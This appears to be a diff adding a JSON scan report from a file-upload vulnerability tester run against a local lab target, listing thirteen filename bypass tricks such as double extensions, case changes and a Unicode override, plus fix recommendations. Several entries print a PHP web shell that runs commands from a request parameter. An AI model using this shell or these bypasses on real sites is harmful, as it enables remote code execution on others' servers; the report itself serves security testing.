@@ -1,0 +1,128 @@
+{
+  "scan_info": {
+    "target": "http://localhost/vulnerabilities/upload/",
+    "start_time": "2026-03-28 15:41:14",
+    "payloads_tested": 19,
+    "tool": "Upload-File-Vuln-Tester v2.0"
+  },
+  "vulnerabilities": [
+    {
+      "technique": "Double Extension",
+      "filename": "shell.php.jpg",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.php.jpg",
+      "rce_verified": true,
+      "rce_output": "<?php\nif(isset($_REQUEST['cmd'])){\n    echo \"<pre>\";\n    $cmd = ($_REQUEST['cmd']);\n    system($cmd);\n    echo \"</pre>\";\n    die;\n}\n?>"
+    },
+    {
+      "technique": "Double Extension Alt",
+      "filename": "shell.jpg.php",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.jpg.php",
+      "rce_verified": true,
+      "rce_output": "<pre>www-data\n</pre>"
+    },
+    {
+      "technique": "Case Variation",
+      "filename": "shell.pHp",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.pHp",
+      "rce_verified": true,
+      "rce_output": "<?php\nif(isset($_REQUEST['cmd'])){\n    echo \"<pre>\";\n    $cmd = ($_REQUEST['cmd']);\n    system($cmd);\n    echo \"</pre>\";\n    die;\n}\n?>"
+    },
+    {
+      "technique": "Case Variation 2",
+      "filename": "shell.PhP",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.PhP",
+      "rce_verified": true,
+      "rce_output": "<?php\nif(isset($_REQUEST['cmd'])){\n    echo \"<pre>\";\n    $cmd = ($_REQUEST['cmd']);\n    system($cmd);\n    echo \"</pre>\";\n    die;\n}\n?>"
+    },
+    {
+      "technique": "Case Variation 3",
+      "filename": "shell.PHP",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.PHP",
+      "rce_verified": true,
+      "rce_output": "<?php\nif(isset($_REQUEST['cmd'])){\n    echo \"<pre>\";\n    $cmd = ($_REQUEST['cmd']);\n    system($cmd);\n    echo \"</pre>\";\n    die;\n}\n?>"
+    },
+    {
+      "technique": "Trailing Dot",
+      "filename": "shell.php.",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.php.",
+      "rce_verified": true,
+      "rce_output": "<?php\nif(isset($_REQUEST['cmd'])){\n    echo \"<pre>\";\n    $cmd = ($_REQUEST['cmd']);\n    system($cmd);\n    echo \"</pre>\";\n    die;\n}\n?>"
+    },
+    {
+      "technique": "Trailing Space",
+      "filename": "shell.php ",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.php ",
+      "rce_verified": true,
+      "rce_output": "<?php\nif(isset($_REQUEST['cmd'])){\n    echo \"<pre>\";\n    $cmd = ($_REQUEST['cmd']);\n    system($cmd);\n    echo \"</pre>\";\n    die;\n}\n?>"
+    },
+    {
+      "technique": "Double Dot",
+      "filename": "shell.php..jpg",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.php..jpg",
+      "rce_verified": true,
+      "rce_output": "<?php\nif(isset($_REQUEST['cmd'])){\n    echo \"<pre>\";\n    $cmd = ($_REQUEST['cmd']);\n    system($cmd);\n    echo \"</pre>\";\n    die;\n}\n?>"
+    },
+    {
+      "technique": "PHP Alternatives",
+      "filename": "shell.php3",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.php3",
+      "rce_verified": true,
+      "rce_output": "<pre>www-data\n</pre>"
+    },
+    {
+      "technique": "PHP Alternatives 2",
+      "filename": "shell.php4",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.php4",
+      "rce_verified": true,
+      "rce_output": "<pre>www-data\n</pre>"
+    },
+    {
+      "technique": "PHP Alternatives 3",
+      "filename": "shell.php5",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.php5",
+      "rce_verified": true,
+      "rce_output": "<pre>www-data\n</pre>"
+    },
+    {
+      "technique": "PHP Alternatives 4",
+      "filename": "shell.phtml",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.phtml",
+      "rce_verified": true,
+      "rce_output": "<pre>www-data\n</pre>"
+    },
+    {
+      "technique": "Unicode Trick",
+      "filename": "shell\u202ephp..jpg",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell\u202ephp..jpg",
+      "rce_verified": true,
+      "rce_output": "<?php\nif(isset($_REQUEST['cmd'])){\n    echo \"<pre>\";\n    $cmd = ($_REQUEST['cmd']);\n    system($cmd);\n    echo \"</pre>\";\n    die;\n}\n?>"
+    }
+  ],
+  "summary": {
+    "total_tests": 19,
+    "successful_uploads": 13,
+    "failed_uploads": 6,
+    "vulnerability_found": true,
+    "severity": "Critical"
+  },
+  "recommendations": [
+    "Implement strict file type validation based on file content, not just extension",
+    "Store uploaded files outside the web root directory",
+    "Use a whitelist of allowed file extensions",
+    "Rename uploaded files to random names",
+    "Implement proper MIME type checking"
+  ]
+}
